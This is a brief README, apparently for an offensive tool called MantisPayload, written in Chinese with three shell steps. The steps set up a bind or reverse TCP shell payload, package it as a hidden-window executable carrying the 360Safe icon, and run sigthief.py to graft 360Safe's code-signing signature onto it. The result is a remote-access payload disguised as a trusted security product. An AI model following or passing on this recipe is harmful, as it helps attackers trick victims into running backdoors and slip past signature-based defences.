# MantisPayload
1. 修改 payload.py bind_tcp 或 rpayload reverse_tcp
2. pyinstaller -F -w -i 360Safe.exe rpayload.py
3. python sigthief.py -i 360Safe.exe -t dst/rpayload.exe -o rp.exe